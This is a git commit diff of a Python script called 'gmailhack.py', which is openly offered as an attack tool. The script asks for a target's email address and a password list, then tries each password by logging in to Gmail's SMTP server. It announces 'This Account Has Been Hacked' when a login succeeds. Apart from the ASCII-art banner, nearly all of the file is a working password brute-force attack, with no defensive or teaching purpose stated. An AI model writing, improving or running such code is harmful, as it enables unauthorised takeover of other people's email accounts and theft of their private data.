b806f93b288f9edafb934aac8ff3e3dd8eeb433a
sibermanguni <61872949+sibermanguni@users.noreply.github.com>
2020-03-09 00:40:57 +0800

    gmailhack

--- gmailhack.py
+++ gmailhack.py
@@ -1,44 +1,74 @@
 #!/usr/bin/python
-# Made By sibermanguni                                       #
-# http://www.youtube.com/c/sibermanguni                   #
-######################################################
-print ("###############################################################################")
-print ("#                                                                             #")
-print ("#    				create by sibermanguni                                #")
-print ("#    								              #")
-print ("#   				   GmailHack                                  #")
-print ("#                                                                             #")
-print ("#                                                                             #")
-print ("#  https://github.com/sibermanguni                                                 #")
-print ("#  http://www.youtube.com/c/sibermanguni		                      #")
-print ("###############################################################################")
-#######################################################################################################
+'''create by sibermanguni'''
 
 import smtplib
-       
-######################################################################################################
+from os import system
 
-file_path = raw_input('Path of Password File :')
-passwfile = open(file_path,'r')
-pass_lst = passwfile.readlines()
+def main():
+   print '================================================='
+   print '               create by sibermanguni                  '
+   print '================================================='
+   print '               ++++++++++++++++++++              '
+   print '\n                                               '
+   print '  _,.                                            '
+   print '                                                 '
+   print '                                                 '
+   print '           sibermanguni                                '
+   print '       _,.                   '
+   print '     ,` -.)                  '
+   print '    ( _/-\\-._               '
+   print '   /,|`--._,-^|            , '
+   print '   \_| |`-._/||          , | '
+   print '     |  `-, / |         /  / '
+   print '     |     || |        /  /  '
+   print '      `r-._||/   __   /  /   '
+   print '  __,-<_     )`-/  `./  /    '
+   print '  \   `---    \   / /  /     '
+   print '     |           |./  /      '
+   print '     /           //  /       '
+   print ' \_/  \         |/  /        '
+   print '  |    |   _,^- /  /         '
+   print '  |    , ``  (\/  /_         '
+   print '   \,.->._    \X-=/^         '
+   print '   (  /   `-._//^`           '
+   print '    `Y-.____(__}             '
+   print '     |     {__)              ' 
+   print '           ()   V.1.0        '
 
+main()
+print '[1] start the attack'
+print '[2] exit'
+option = input('==>')
+if option == 1:
+   file_path = raw_input('path of passwords file :')
+else:
+   system('clear')
+   exit()
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
 def login():
     i = 0
-    usr = raw_input('What is the targets email address :')
+    user_name = raw_input('target email :')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
-    for passw in pass_lst:
+    for password in pass_list:
       i = i + 1
-      print str(i) + '/' + str(len(pass_lst))
+      print str(i) + '/' + str(len(pass_list))
       try:
-         server.login(usr, passw)
-         print '[+] Password Found: %s ' % passw
+         server.login(user_name, password)
+         system('clear')
+         main()
+         print '\n'
+         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
-            print '[+] Password Found: %s ' % passw
+            system('clear')
+            main()
+            print '[+] this account has been hacked, password :' + password + '     ^_^'
+
             break
          else:
-            print '[!] Password Incorrect: %s ' % passw
+            print '[!] password not found => ' + password
 login()
